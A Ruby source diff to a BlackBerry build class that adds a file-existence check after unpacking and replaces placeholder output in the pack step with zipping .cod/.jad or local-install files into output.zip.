@@ -36,6 +36,8 @@ class BuildBlackberry < Build
       end
     end
 
+    File.exist?(path('net_rim_bb_lib.cod')) || raise("unpack failed. needed file not found")
+
   end
   
   def patch(params)
@@ -115,9 +117,23 @@ class BuildBlackberry < Build
   def pack(params)
     trace :debug, "Build: pack: #{params}"
 
-    puts
-    puts "PACKING"
-    puts
+    case params['type']
+      when 'remote'
+        Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
+          @outputs.delete_if {|o| o['res']}.keep_if {|o| o['.cod'] || o['.jad']}.each do |output|
+            z.file.open(output, "w") { |f| f.write File.open(path(output), 'rb') {|f| f.read} }
+          end
+        end
+      when 'local'
+        Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
+          @outputs.keep_if {|o| o['res'] || o['install.bat'] || o['bin']}.each do |output|
+            z.file.open(output, "w") { |f| f.write File.open(path(output), 'rb') {|f| f.read} }
+          end
+        end
+    end
+
+    # this is the only file we need to output after this point
+    @outputs = ['output.zip']
 
   end
 
